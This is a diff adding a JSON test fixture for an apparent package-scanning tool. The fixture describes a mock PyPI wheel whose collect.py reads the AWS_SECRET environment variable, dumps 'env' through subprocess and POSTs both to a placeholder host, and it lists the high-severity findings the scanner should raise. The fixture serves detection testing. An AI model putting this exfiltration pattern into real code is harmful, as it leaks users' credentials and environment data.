@@ -1,0 +1,78 @@
+{
+  "id": "pypi-python-sink-exfil",
+  "title": "wheel module chains Python process, network, and credential sinks",
+  "category": "code-capability",
+  "intent": "ratifies the Python-aware shared code.* rules on a non-setup module: subprocess + requests + os.environ",
+  "manifest": {
+    "schema": "drydock.release-artifacts.v1",
+    "ecosystem": "pypi",
+    "package": "demo-package",
+    "version": "1.2.0",
+    "artifacts": [
+      {
+        "path": "dist/demo_package-1.2.0-py3-none-any.whl",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "path": "dist/demo_package-1.2.0-py3-none-any.whl",
+      "files": [
+        {
+          "path": "demo_package-1.2.0.dist-info/METADATA",
+          "size": 64,
+          "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+          "flags": [],
+          "textSample": "Metadata-Version: 2.3\nName: demo-package\nVersion: 1.2.0\n"
+        },
+        {
+          "path": "demo_package-1.2.0.dist-info/WHEEL",
+          "size": 60,
+          "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+          "flags": [],
+          "textSample": "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
+        },
+        {
+          "path": "demo_package-1.2.0.dist-info/RECORD",
+          "size": 220,
+          "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+          "flags": [],
+          "textSample": "demo_package/__init__.py,sha256=abc,12\ndemo_package/collect.py,,\ndemo_package-1.2.0.dist-info/METADATA,,\ndemo_package-1.2.0.dist-info/WHEEL,,\ndemo_package-1.2.0.dist-info/RECORD,,\n"
+        },
+        {
+          "path": "demo_package/__init__.py",
+          "size": 24,
+          "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+          "flags": [],
+          "textSample": "__version__ = \"1.2.0\"\n"
+        },
+        {
+          "path": "demo_package/collect.py",
+          "size": 220,
+          "sha256": "ffff1111111111111111111111111111111111111111111111111111111111ff",
+          "flags": [],
+          "textSample": "import os\nimport subprocess\nimport requests\n\n\ndef run():\n    value = os.environ.get(\"AWS_SECRET\")\n    output = subprocess.check_output([\"env\"])\n    requests.post(\"https://example.invalid/collect\", data={\"v\": value, \"o\": output})\n"
+        }
+      ]
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "wheel/py3-none-any/demo_package/collect.py"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "wheel/py3-none-any/demo_package/collect.py"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "wheel/py3-none-any/demo_package/collect.py"
+    }
+  ]
+}
